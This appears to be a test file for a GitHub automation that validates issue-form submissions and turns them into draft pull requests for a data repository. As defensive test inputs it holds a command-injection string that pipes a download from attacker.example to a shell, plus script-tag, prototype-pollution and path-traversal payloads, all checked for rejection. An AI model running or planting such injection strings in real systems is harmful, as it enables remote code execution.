import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { files, type FileName } from "../schema/src/schema.ts";
import { applyRequest, fenced, formFor, loadForms, parseBody, readRequest, serialize, type Kind } from "./forms.ts";
import { commitMessage, mayLabel, prBody, prepare, problemComment } from "./form-pr.ts";
import { branchFor, handOver, readBundle } from "./form-open.mjs";

const TODAY = "2026-11-15";
const forms = loadForms();
const fixture = (name: string) => readFileSync(new URL(`./fixtures/forms/${name}.md`, import.meta.url), "utf8");
// The repository's data, with the check dates these tests rely on pinned: a merged
// confirmation (the very thing the forms make) must not break the tests.
const data = () => {
  const out = {} as Record<FileName, any>;
  for (const name of Object.keys(files) as FileName[]) out[name] = JSON.parse(readFileSync(new URL(`../data/${name}.json`, import.meta.url), "utf8"));
  for (const id of ["moblin", "irl-pro", "obs-studio"]) out.services.services.find((s: any) => s.id === id).checked_on = "2026-11-14";
  out.words.words.find((w: any) => w.id === "srt").checked_on = "2026-11-14";
  return out;
};
const form = (kind: Kind) => forms.find((f) => f.kind === kind)!;
const run = (kind: Kind, name: string, d = data()) => {
  const { values, problems } = parseBody(form(kind), fixture(name));
  expect(problems).toEqual([]);
  const read = readRequest(form(kind), values, TODAY);
  expect(read.problems).toEqual([]);
  return { request: read.request!, change: applyRequest(read.request!, d), data: d };
};
const event = (kind: Kind, name: string) => ({
  action: "labeled", label: { name: "make-pr" }, sender: { login: "pjeweb" },
  issue: { number: 42, body: fixture(name), labels: [{ name: form(kind).label }], user: { login: "sample-user", id: 1234 }, state: "open" },
});

describe("the issue forms", () => {
  test("there are four, each with its own label", () => {
    expect(forms.map((f) => f.kind).sort()).toEqual(["confirm", "edit", "maker", "new"]);
    expect(new Set(forms.map((f) => f.label)).size).toBe(4);
  });
  test("fields a link can fill are text inputs with stable ids", () => {
    for (const f of forms) {
      for (const id of ["entry", "source", "read_on"]) expect(f.fields.find((x) => x.id === id)?.type).toBe("input");
      if (f.kind !== "confirm") for (const id of ["name", "link"]) expect(f.fields.find((x) => x.id === id)?.type).toBe("input");
      expect(f.fields.find((x) => x.id === "dataset")?.type).toBe("dropdown");
    }
  });
  test("every dataset option names a data file", () => {
    const doc = Bun.YAML.parse(readFileSync(new URL("../.github/ISSUE_TEMPLATE/new-entry.yml", import.meta.url), "utf8")) as any;
    const options = doc.body.find((b: any) => b.id === "dataset").attributes.options.map((o: string) => o.split(":")[0]);
    expect(options).toEqual(["words", "answers", "services", "guides", "standards", "plans"]);
  });
  test("an issue matches exactly one form by its label", () => {
    expect(formFor(forms, ["form: confirm", "make-pr"])).toBe(form("confirm"));
    expect(typeof formFor(forms, ["make-pr"])).toBe("string");
    expect(typeof formFor(forms, ["form: confirm", "form: edit"])).toBe("string");
  });
});

describe("parsing a form body", () => {
  test("reads values, empty answers and dropdowns", () => {
    const { values } = parseBody(form("confirm"), fixture("confirm-moblin"));
    expect(values.entry).toBe("services/moblin");
    expect(values.dataset).toBe("");
    expect(values.conflict).toBe("No");
    expect(values.conflict_details).toBe("");
    expect(values.checked).toStartWith("The README still says");
  });
  test("unwraps the JSON code fence GitHub adds", () => {
    const { values } = parseBody(form("new"), fixture("new-word"));
    expect(JSON.parse(values.fields).tier).toBe("more");
  });
  test("Windows line endings read the same", () => {
    const { values } = parseBody(form("confirm"), fixture("confirm-moblin").replace(/\n/g, "\r\n"));
    expect(values.read_on).toBe("2026-11-15");
  });
  test("a heading typed into a text field is refused, not used", () => {
    const { problems } = parseBody(form("confirm"), fixture("hostile"));
    expect(problems.join(" ")).toContain('"Entry" appears more than once');
  });
  test("a missing required field is named", () => {
    const body = fixture("confirm-moblin").replace("### Source you read", "### Source");
    expect(parseBody(form("confirm"), body).problems).toEqual(['The field "Source you read" is missing from the issue text.']);
  });
});

describe("checking the values", () => {
  const values = () => parseBody(form("confirm"), fixture("confirm-moblin")).values;
  const problems = (change: Record<string, string>, kind: Kind = "confirm") => readRequest(form(kind), { ...values(), ...change }, TODAY).problems;
  test("dataset from the entry, or from the dropdown", () => {
    expect(run("confirm", "confirm-word-dropdown").request).toMatchObject({ dataset: "words", id: "srt" });
    expect(problems({ dataset: "words: the word list" })).toEqual(['"Entry" and "Dataset" name different datasets.']);
    expect(problems({ entry: "moblin" })[0]).toStartWith("Pick a dataset");
  });
  test("ids, links and dates are checked; problems never quote the values", () => {
    expect(problems({ entry: "services/Bad_Id" })).toHaveLength(1);
    expect(problems({ source: "http://example.org/" })).toEqual(['"Source you read" must be one https:// link, and not a chat invite.']);
    expect(problems({ source: "https://disco" + "rd.gg/abc" })).toHaveLength(1);
    expect(problems({ source: "https://a.example/ https://b.example/" })).toHaveLength(1);
    expect(problems({ read_on: "2026-02-30" })).toHaveLength(1);
    expect(problems({ read_on: "2026-11-16" })).toEqual(['"Date you read it" is in the future.']);
    expect(problems({ read_on: "15.11.2026" })).toHaveLength(1);
    const hostile = "$(curl https://attacker.example | sh)";
    for (const p of problems({ entry: hostile, source: hostile, read_on: hostile })) expect(p).not.toContain("curl");
  });
  test("a declared conflict needs its details", () => {
    expect(problems({ conflict: "Yes" })).toHaveLength(1);
    expect(problems({ conflict: "Maybe" })).toHaveLength(1);
    expect(problems({ conflict: "Yes", conflict_details: "I work for the maker." })).toEqual([]);
  });
  test("very long text is refused", () => {
    expect(problems({ checked: "x".repeat(5001) })).toEqual(['"What you checked" is longer than 5000 characters.']);
  });
  test("JSON must be an object", () => {
    const base = parseBody(form("edit"), fixture("edit-json")).values;
    for (const fields of ["[1]", "\"text\"", "{not json"])
      expect(readRequest(form("edit"), { ...base, fields }, TODAY).problems).toHaveLength(1);
  });
});

describe("writing the entry", () => {
  test("a confirmation moves only checked_on and keeps the file's layout", () => {
    const { change, data: before } = run("confirm", "confirm-moblin");
    expect(change.status).toBe("ready");
    expect(change.summary).toEqual(["Moves `checked_on` from 2026-11-14 to 2026-11-15."]);
    expect(change.notes).toEqual(["The source in the form is already listed on the entry."]);
    const old = serialize(before.services).split("\n");
    const now = serialize(change.doc).split("\n");
    expect(now.length).toBe(old.length);
    expect(now.filter((l, i) => l !== old[i])).toEqual([expect.stringContaining('"checked_on": "2026-11-15"')]);
    expect(files.services.safeParse(change.doc).success).toBe(true);
  });
  test("a confirmation sets checked_on on a word that had none", () => {
    const d = data();
    delete d.words.words.find((w: any) => w.id === "srt").checked_on;
    const { change } = run("confirm", "confirm-word-dropdown", d);
    expect(change.summary).toEqual(["Sets `checked_on` to 2026-11-15."]);
    expect(change.notes[0]).toContain("isn't listed on the entry yet");
  });
  test("a confirmation with an older or the same date changes nothing", () => {
    const d = data();
    d.services.services.find((s: any) => s.id === "moblin").checked_on = "2026-11-15";
    expect(run("confirm", "confirm-moblin", d).change).toMatchObject({ status: "invalid", problems: ["That date is already recorded on the entry. Nothing to change."] });
    d.services.services.find((s: any) => s.id === "moblin").checked_on = "2026-11-16";
    expect(run("confirm", "confirm-moblin", d).change.status).toBe("invalid");
  });
  test("an edit applies JSON fields and the date", () => {
    const { change } = run("edit", "edit-json");
    expect(change.status).toBe("ready");
    expect(change.after!.support).toEqual([{ label: "IRL Pro help", url: "https://irlpro.app/help" }]);
    expect(change.after!.checked_on).toBe("2026-11-15");
    expect(files.services.safeParse(change.doc).success).toBe(true);
  });
  test("an edit described only in words is left for a steward", () => {
    expect(run("edit", "edit-prose-only").change.status).toBe("manual");
  });
  test("ticked tag boxes add only the tags an entry doesn't have yet", () => {
    const { request, change } = run("edit", "edit-tags");
    expect(request.tags).toEqual(["camera-in", "multi-camera"]);
    expect(change.status).toBe("ready");
    expect(change.after!.tags).toEqual(["multi-camera", "camera-in"]);
    expect(change.summary).toContain("Adds the tag `camera-in`.");
  });
  test("a tag box the form doesn't offer is refused", () => {
    const values = parseBody(form("edit"), fixture("edit-tags").replace("- [X] multi-camera:", "- [X] dslr:")).values;
    expect(readRequest(form("edit"), values, TODAY).problems).toEqual(['"Tags (apps and services only, optional)" has a box this form doesn\'t offer.']);
  });
  test("JSON can't change the id or the date, or add unknown fields", () => {
    const { request } = run("edit", "edit-json");
    for (const fields of [{ id: "other" }, { checked_on: "2026-11-15" }, { colour: "red" }, JSON.parse('{"__proto__": {"x": 1}}')])
      expect(applyRequest({ ...request, fields }, data()).status).toBe("invalid");
    expect(({} as any).x).toBeUndefined();
  });
  test("a maker edit renames the entry", () => {
    const { change, request } = run("maker", "maker-rename");
    expect(request.conflict).toBe(true);
    expect(change.after!.name).toBe("IRL Pro Streamer");
    expect(change.summary).toContain("Sets `name` to the new name.");
    expect(change.summary.join(" ")).not.toContain("`url`");
  });
  test("a label proposal keeps the product's label for the steward", () => {
    const { request, change } = run("maker", "maker-label");
    expect(request.productLabel).toBe('"Latency (ms)" inside the SRT section, because the section title already says SRT.');
    expect(change.status).toBe("manual");
  });
  test("JSON can't set the generated aliases of a word", () => {
    const { request } = run("maker", "maker-label");
    expect(applyRequest({ ...request, fields: { aliases: ["x"] } }, data()).status).toBe("invalid");
    const change = applyRequest({ ...request, fields: { search_terms: ["SRT latency setting"] } }, data());
    expect(change.status).toBe("ready");
    expect(change.after!.aliases).toContain("SRT latency setting");
  });
  test("a new word is complete when the JSON gives the rest", () => {
    const { change } = run("new", "new-word");
    expect(change.after).toMatchObject({ id: "keyframe-interval", term: "Keyframe interval", tier: "more", who: "helper", also_called: [], search_terms: [], aliases: [], related: [], uncertain: true, source: "https://obsproject.com/kb/stream-connection-troubleshooting", checked_on: "2026-11-15" });
    expect(files.words.safeParse(change.doc).success).toBe(true);
    expect(change.notes.join(" ")).not.toContain("Still missing");
  });
  test("a new service without JSON lists what a steward still fills in", () => {
    const { change } = run("new", "new-service");
    expect(change.after).toMatchObject({ id: "sample-relay", name: "Sample Relay", url: "https://relay.example.org/", links: [{ label: "relay.example.org", url: "https://relay.example.org/docs" }] });
    expect(change.notes.join(" ")).toContain("`kind`, `role`, `class`, `hosting`, `maker`");
    expect(files.services.safeParse(change.doc).success).toBe(false);
  });
  test("a new entry can't reuse an id, and an edit needs one that exists", () => {
    const { request } = run("new", "new-service");
    expect(applyRequest({ ...request, id: "moblin" }, data()).status).toBe("invalid");
    expect(applyRequest({ ...run("edit", "edit-json").request, id: "no-such-entry" }, data()).status).toBe("invalid");
  });
  test("a guide keeps its generated title in step", () => {
    const d = data();
    const guide = d.guides.guides[0];
    const { request } = run("edit", "edit-json");
    const change = applyRequest({ ...request, dataset: "guides", id: guide.id, fields: { part: ["sender"] } }, d);
    expect(change.after!.title_display).toEndWith(": set up the sender");
  });
});

describe("the pull request and the reply", () => {
  test("the whole confirmation, from event to text", () => {
    const { meta, doc } = prepare(event("confirm", "confirm-moblin"), TODAY, data());
    expect(meta.status).toBe("ready");
    expect(doc).not.toBeNull();
    expect(commitMessage(meta)).toBe(
      "Confirm services/moblin against its source\n\nFrom the form in #42. The source was read on 2026-11-15.\n\n" +
      "Co-authored-by: sample-user <1234+sample-user@users.noreply.github.com>\n");
    const body = prBody(meta, { passed: true, output: "" });
    expect(body).toStartWith("This draft comes from the form in #42, filled in by @sample-user. Thank you!");
    expect(body).toContain("**Conflict of interest:** none declared.");
    expect(body).toContain("**Data check:** passes.");
    expect(body).toEndWith("Closes #42\n");
  });
  test("free text from the form stays inside a code block", () => {
    const { meta } = prepare(event("confirm", "confirm-moblin"), TODAY, data());
    meta.request!.checked = "@everyone ```\n<script>x</script>";
    const body = prBody(meta, { passed: false, output: "$ bun scripts/check.ts\ndata/services.json: services.0.kind: missing" });
    expect(body).toContain("````text\n@everyone ```\n<script>x</script>\n````");
    expect(body).toContain("```text\ndata/services.json: services.0.kind: missing\n```");
  });
  test("a label proposal shows the product's label in its own code block", () => {
    const { meta } = prepare(event("maker", "maker-rename"), TODAY, data());
    meta.request!.productLabel = "Relay";
    expect(prBody(meta, { passed: true, output: "" })).toContain("**The label their product uses, and why**\n\n```text\nRelay\n```");
  });
  test("a declared conflict and a maker request say who reviews", () => {
    expect(prBody(prepare(event("new", "new-service"), TODAY, data()).meta, { passed: false, output: "" })).toContain("declared in the form. An independent steward reviews it.");
    expect(prBody(prepare(event("maker", "maker-rename"), TODAY, data()).meta, { passed: true, output: "" })).toContain("edit request from the maker or a competitor");
  });
  test("a form with problems gets a reply that lists them", () => {
    const { meta, doc } = prepare(event("confirm", "hostile"), TODAY, data());
    expect(meta.status).toBe("invalid");
    expect(doc).toBeNull();
    expect(problemComment(meta)).toContain("- The heading \"Entry\" appears more than once");
    expect(problemComment(meta)).not.toContain("curl");
  });
  test("an issue without a form label is refused", () => {
    const e = event("confirm", "confirm-moblin");
    e.issue.labels = [];
    expect(prepare(e, TODAY, data()).meta.problems[0]).toContain("no form label");
  });
  test("code blocks are always longer than the text's own backticks", () => {
    expect(fenced("a ````` b")).toStartWith("``````text\n");
  });
});

describe("who may turn a form into a draft", () => {
  const stewards = [{ github: "pjeweb" }, { github: null }];
  test("a listed steward, without asking GitHub", async () => {
    expect(await mayLabel("PJEWEB", stewards, async () => { throw new Error("not called"); })).toBe(true);
  });
  test("someone with write access", async () => {
    expect(await mayLabel("helper", stewards, async () => "write")).toBe(true);
    expect(await mayLabel("helper", stewards, async () => "maintain")).toBe(true);
  });
  test("not someone who can only triage or read", async () => {
    for (const role of ["triage", "read", "none"]) expect(await mayLabel("helper", stewards, async () => role)).toBe(false);
  });
});

describe("the bundle the write job accepts", () => {
  const dir = () => {
    const { mkdtempSync, mkdirSync, writeFileSync } = require("node:fs");
    const { join } = require("node:path");
    const root = mkdtempSync(join(require("node:os").tmpdir(), "form-"));
    mkdirSync(join(root, "data"));
    return { root, write: (p: string, s: string) => writeFileSync(join(root, p), s) };
  };
  test("one data file of a known dataset", () => {
    const { root, write } = dir();
    write("meta.json", JSON.stringify({ issue: 42, status: "ready", request: { dataset: "services" } }));
    write("data/services.json", "{}\n");
    write("pr.json", JSON.stringify({ title: "t", body: "b", message: "m" }));
    expect(readBundle(root, 42)).toMatchObject({ status: "ready", path: "data/services.json" });
    expect(() => readBundle(root, 43)).toThrow("another issue");
    write("meta.json", JSON.stringify({ issue: 42, status: "ready", request: { dataset: "../workflows/x" } }));
    expect(() => readBundle(root, 42)).toThrow("unknown dataset");
  });
  test("a reply when the form had problems", () => {
    const { root, write } = dir();
    write("meta.json", JSON.stringify({ issue: 7, status: "invalid" }));
    write("comment.md", "Thank you!");
    expect(readBundle(root, 7)).toEqual({ status: "invalid", comment: "Thank you!" });
  });
  test("the branch name comes from the issue number only", () => {
    expect(branchFor(42)).toBe("form/issue-42");
  });
  test("when the pull request can't be opened, the reply links the ready branch", () => {
    expect(handOver("irl-commons/irl-commons", "form/issue-42")).toContain("https://github.com/irl-commons/irl-commons/compare/main...form/issue-42?expand=1");
  });
});
